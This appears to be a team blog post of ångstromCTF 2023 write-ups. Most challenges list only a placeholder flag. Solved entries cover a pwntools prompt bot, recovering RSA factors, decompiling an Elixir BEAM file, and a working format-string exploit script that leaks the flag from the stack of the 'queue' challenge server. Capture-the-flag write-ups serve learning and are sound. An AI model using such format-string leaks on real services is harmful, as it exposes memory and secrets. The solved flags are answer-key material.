---
layout: post
category: writeups
title: "ångstromCTF 2023"
date: 2023-04-27
ctf_categories:
  - misc
  - web
  - crypto
  - rev
  - pwn
---

# Misc

## Physics HW

> _My physics teacher also loves puzzles. Maybe my homework is a puzzle too?_<br>
> _Attachments: physics_hw.png_

🏁 _<FLAG_HERE>_{: .spoiler}

## Admiral Shark

> _I have been snooping on the conversations of my elusive enemies. See if you can help me gather the information I need to defeat them once and for all._<br>
> _Attachments: admiral_shark.pcapng_

🏁 _<FLAG_HERE>_{: .spoiler}

## Simon Says

> _This guy named Simon gave me a bunch of tasks to complete and not a lot of time. He wants to run a unique zoo but needs the names for his animals. Can you help me?_<br>
> _nc challs.actf.co xxxxx_

Connecting to the challenge presented you with a series of prompts like these, the entirety of which you had to solve before a global 3s timeout closed the connection:

```plaintext
Combine the first 3 letters of zebra with the last 3 letters of donkey
> zebkey
Combine the first 3 letters of wombat with the last 3 letters of bear
> womear
[...]
```

With a little help from pwntools to automate the connection this was an easy task:

```python
import re
from pwn import *

conn = remote('challs.actf.co', xxxxx)

while True:
    prompt = conn.recvline().decode('ascii')
    if 'actf{' in prompt:
        print(f"!!! {prompt.strip()}")
        break
    else:
        print(f">>> {prompt.strip()}")

    tokens = re.search(r"Combine the first ([0-9]+) letters of ([a-z]+) with the last ([0-9]+) letters of ([a-z]+)", prompt)
    if len(tokens.groups()) != 4:
        break

    reply = f'{tokens.group(2)[:int(tokens.group(1))]}{tokens.group(4)[-int(tokens.group(3)):]}'
    print(f"<<< {reply}")
    conn.send((reply + '\n').encode('ascii'))

conn.close()
```

```plaintext
[+] Opening connection to challs.actf.co on port xxxxx: Done
>>> Combine the first 3 letters of fish with the last 3 letters of lion
<<< fision
[...]
>>> Combine the first 3 letters of vulture with the last 3 letters of lion
<<< vulion
!!! actf{simon_says_you_win}
[*] Closed connection to challs.actf.co port xxxxx
```

🏁 _actf{simon_says_you_win}_{: .spoiler}

## better me

> _With the power of ARTIFICIAL INTELLIGENCE, I can replace myself!! Ask your questions to this guy, instead._<br>
> _https://xxxxx.actf.co/_

🏁 _<FLAG_HERE>_{: .spoiler}

## Obligatory

> _"angstrom needs a pyjail" - kmh11_<br>
> _nc challs.actf.co xxxxx_<br>
> _Attachments: jail.py, Dockerfile_

🏁 _<FLAG_HERE>_{: .spoiler}

# Web

## catch me if you can

> _Somebody help!_<br>
> _https://xxxxx.actf.co/_

🏁 _<FLAG_HERE>_{: .spoiler}

## Celeste Speedrunning Association

> _I love Celeste Speedrunning so much!!! It's so funny to watch!!! Here's my favorite site!_<br>
> _https://xxxxx.actf.co/_

🏁 _<FLAG_HERE>_{: .spoiler}

## shortcircuit

> _Bzzt_<br>
> _https://xxxxx.actf.co/_

## directory

> _This is one of the directories of all time, and I would definitely rate it out of 10._<br>
> _https://xxxxx.actf.co/_

🏁 _<FLAG_HERE>_{: .spoiler}

## Celeste Tunnelling Association

> _Welcome to the tunnels!! Have fun!_<br>
> _https://xxxxx.tailxxxxx.ts.net/_<br>
> _Attachments: server.py_

## Hallmark

> _Send your loved ones a Hallmark card! Maybe even send one to the admin 😳._<br>
> _https://xxxxx.actf.co/, https://xxxxx-bot.actf.co/hallmark_<br>
> _Attachments: dist.tar.gz_

🏁 _<FLAG_HERE>_{: .spoiler}

## brokenlogin

> _Talk about a garbage website... I don't think anybody's been able to log in yet! If you find something, make sure to let the admin know._<br>
> _https://xxxxx.actf.co/, https://xxxxx-bot.actf.co/brokenlogin_<br>
> _Attachments: app.py, brokenlogin.js_

🏁 _<FLAG_HERE>_{: .spoiler}

# Crypto

## ranch

> _Caesar dressing is so 44 BC..._<br>
> _`rtkw{cf0bj_czbv_nv'cc_y4mv_kf_kip_re0kyvi_uivjj1ex_5vw89s3r44901831}`_<br>
> _Attachments: ranch.py_

🏁 _<FLAG_HERE>_{: .spoiler}

## impossible

> _Is this challenge impossible?_<br>
> _nc challs.actf.co xxxxx_<br>
> _Attachments: impossible.py_

🏁 _<FLAG_HERE>_{: .spoiler}

## Lazy Lagrange

> _Lagrange has gotten lazy, but he's still using Lagrange interpolation...or is he?_<br>
> _nc challs.actf.co xxxxx_<br>
> _Attachments: lazylagrange.py_

🏁 _<FLAG_HERE>_{: .spoiler}

## Royal Society of Arts

> _RSA strikes strikes strikes strikes again again again again!_<br>
> _Attachments: rsa.py, out.txt_

We are given a python program and the corresponding output. The python program looks like this:

```python
from Crypto.Util.number import getStrongPrime, bytes_to_long
f = open("flag.txt").read()
m = bytes_to_long(f.encode())
p = getStrongPrime(512)
q = getStrongPrime(512)
n = p*q
e = 65537
c = pow(m,e,n)
print("n =",n)
print("e =",e)
print("c =",c)
print("(p-2)*(q-1) =", (p-2)*(q-1))
print("(p-1)*(q-2) =", (p-1)*(q-2))
```

Other than `n,e` and `c` there are also `(p-2)(q-1)` and `(p-1)(q-2)` so we have two equations where we know the results. To decrypt RSA we need `p` and `q` so we can get them by solving a system of equation like so:

$$
\begin{equation}
    \begin{cases}
      (p-2)(q-1) = \text{number given}\\
      (p-1)(q-2) =\text{number given}\\
      p\cdot q = n
    \end{cases}
\end{equation}
$$

Solving this simple system with `sagemath` will give us `p` and `q`.
After that we can decrypt the message with:

$$
d = e^{-1} \mod (p-1)(q-1)
$$

and the flag:

$$
m = c^{d} \mod n
$$

converting `m` from long to bytes_string will give us the flag!

🏁 _actf{tw0_equ4ti0ns_in_tw0_unkn0wns_d62507431b7e7087}
_{: .spoiler}

# Rev

## checkers

> _Attachments: checkers_

🏁 _<FLAG_HERE>_{: .spoiler}

## zaza

> _Bedtime!_<br>
> _nc challs.actf.co xxxxx_<br>
> _Attachments: zaza_

🏁 _<FLAG_HERE>_{: .spoiler}

## Bananas

> _A friend sent this to me. Can you help me find out what they want?_<br>
> _nc challs.actf.co xxxxx_<br>
> _Attachments: Elixir.Bananas.beam_

If we connect to the trhough netcat the server will ask `How many bananas do I have?` so we have to find how many bananas he needs.

We are given an `Elixir.Banans.beam` and if you are a little bit familiar with Elixir you will see that this is a compiled Earlang file for the Earlang VM.
The first thing I did was trying to execute the file, but strangely, it returns an error for the encoding when running it like so:

```shell
elixir Elixir.Bananas.beam
```

I tried running it with other strategies without success using the interactive elixir shell:

```shell
iex Elixir.Bananas.beam
```

So I had to use another strategy, maybe decompiling it?
Because of the fact that it's a beam bytecode I thought it will be a tool to decompile it so I found [this](https://elixirforum.com/t/need-help-decompiling-beam-file/45441/15) post from the elixir forum using the `niahoo/decompilerl`.

I created a new elixir project with

```shell
mix new myproject
```

And added in the `mix.exs` file I added the dependency:

```elixir
  defp deps do
    [
      {:decompilerl, github: "niahoo/decompilerl"}
      # {:dep_from_hexpm, "~> 0.3.0"},
      # {:dep_from_git, git: "https://github.com/elixir-lang/my_dep.git", tag: "0.1.0"}
    ]
  end
```

After that i created a file `tt.exs` in the root of the project and used the following code:

{:.linenumber}
```elixir
Code.append_path(File.cwd!())
Decompilerl.decompile(:Elixir_Bananas)
System.halt()
```

Note that in the second line we have to specify the file name so I had to rename `Elixir.Bananas.beam` to `Elixir_Bananas.beam` because with dots doesn't work.

Running the `tt.exs` file will return the decompiled earlang file:

```erlang
Retrieving code for Elixir_Bananas
-file("lib/bananas.ex", 1).

-module('Elixir.Bananas').

-compile([no_auto_import]).

-export(['__info__'/1, main/0, main/1]).

-spec '__info__'(attributes |
                 compile |
                 functions |
                 macros |
                 md5 |
                 exports_md5 |
                 module |
                 deprecated |
                 struct) -> any().

'__info__'(module) -> 'Elixir.Bananas';
'__info__'(functions) -> [{main, 0}, {main, 1}];
'__info__'(macros) -> [];
'__info__'(struct) -> nil;
'__info__'(exports_md5) ->
    <<"TÀ}ÏÚ|º6þ\020Í\f\035\005\222\203">>;
'__info__'(Key = attributes) ->
    erlang:get_module_info('Elixir.Bananas', Key);
'__info__'(Key = compile) ->
    erlang:get_module_info('Elixir.Bananas', Key);
'__info__'(Key = md5) ->
    erlang:get_module_info('Elixir.Bananas', Key);
'__info__'(deprecated) -> [].

check([_num@1, <<"bananas">>]) ->
    (_num@1 + 5) * 9 - 1 == 971;
check(__asdf@1) -> false.

convert_input(_string@1) ->
    to_integer('Elixir.String':split('Elixir.String':trim(_string@1))).

main() -> main([]).

main(_args@1) ->
    print_flag(check(convert_input('Elixir.IO':gets(<<"How many bananas do I have?\n">>)))).

print_flag(false) -> 'Elixir.IO':puts(<<"Nope">>);
print_flag(true) ->
    'Elixir.IO':puts('Elixir.File':'read!'(<<"flag.txt">>)).

to_integer([_num@1, _string@1]) ->
    [erlang:binary_to_integer(_num@1), _string@1];
to_integer(_list@1) -> _list@1.
```

Althought I've never seen earlang code we see that there is a suspicious line where there is an operation made with `num@1` wich I guess is part of the input:

```erlang
    (_num@1 + 5) * 9 - 1 == 971;
```

it will return true only if the operation returns `971` so using my math super skills I reversed the equation and got `103`.
But using `103` as the input on the server doesn't work why?

Looking more closely to the code we see that the check is for `num@1` and `"bananas"`. So maybe my input as to be `103 bananas`...

Yes! That was it, using this input the server returns the flag

🏁 _actf{baaaaannnnananananas_yum}_{: .spoiler}

# Pwn

## queue

> _I just learned about stacks and queues in DSA!_<br>
> _nc challs.actf.co xxxxx_<br>
> _Attachments: queue_

Connecting to the challenge we are asked: `What did you learn in class today?` so we can send a string. We can submit a format string like `%p` to see that it returns `Oh nice, 0x7ffe79e8d120`. We can also access directly some parameters in this way:

`%<number_of_parameter>$<format>` for exemple: `%14$llx,%15$llx,%16$llx`; it returns: 

`Oh nice, 3474737b66746361,75715f74695f6b63,615f74695f657565`.
We can see with some tries that the flag is here in the stack. So we can script the solution.

```python
from Crypto.Util.number import *
from pwn import *

flag = ""
host =  "challs.actf.co"
port = 31322
for i in range (14, 19, 1):
    r = remote(host, port)
    r.recvuntil(b'? ')
    payload = f'%{i}$llx,%{i+1}$llx'
    r.sendline(bytes(payload, 'utf-8'))
    r.recvuntil(b'Oh nice, ')
    stringa = r.recvline()
    stringa = stringa.decode('utf-8')
    stringhe = stringa.split(',')
    temp = ''
    for s in stringhe:
        if len(s)%2 != 0:
            s = '0' + s
        temp += s
    temp = temp.strip()
    temp = temp[:-1]
    flag = flag + str((bytes.fromhex(temp)[::-1])[-8:])
    r.close()
flag = flag.replace('\'b\'', '')
print(flag)
```
If the input string is too long it overwrite the flag in the stack, so we have to take it piece by piece. The code above take 8 chars of the flag at every iteration and put them in the variable flag. At the end we only clean the output.


🏁 _<actf{st4ck_it_queue_it_a619ad974c864b22}>_{: .spoiler}

## gaga

> _Multipart challenge! Note all use essentially the same Dockerfile. The flags are split among all three challenges. If you are already a pwn expert, the last challenge has the entire flag._<br>
> _nc challs.actf.co xxxxx, xxxx, xxxx_<br>
> _Attachments: gaga0, gaga1, gaga2, Dockerfile_

🏁 _<FLAG_HERE>_{: .spoiler}

## leek

> _nc challs.actf.co xxxxx_<br>
> _Attachments: leek, Dockerfile_

🏁 _<FLAG_HERE>_{: .spoiler}

## widget

> _I seem to have lost my gadgets._<br>
> _nc challs.actf.co xxxxx_<br>
> _Attachments: widget, Dockerfile_

🏁 _<FLAG_HERE>_{: .spoiler}
